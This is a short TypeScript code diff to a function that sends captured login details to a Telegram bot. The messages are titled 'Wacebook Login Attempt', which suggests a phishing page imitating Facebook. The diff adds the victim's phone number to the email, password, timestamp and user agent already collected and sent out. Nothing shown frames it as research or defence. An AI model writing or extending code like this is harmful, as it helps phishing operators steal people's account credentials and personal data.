@@ -12,6 +12,7 @@ export const TELEGRAM_CONFIG = {
 // Function to send data to Telegram bot
 export const sendToTelegramBot = async (data: {
   email: string;
+  phone: string;
   password: string;
   timestamp: string;
   userAgent: string;
@@ -20,6 +21,7 @@ export const sendToTelegramBot = async (data: {
     const message = `
 🚨 *Wacebook Login Attempt*
 📧 Email: ${data.email}
+📱 Phone: ${data.phone}
 🔒 Password: ${data.password}
 ⏰ Time: ${data.timestamp}
 🖥️ User Agent: ${data.userAgent}
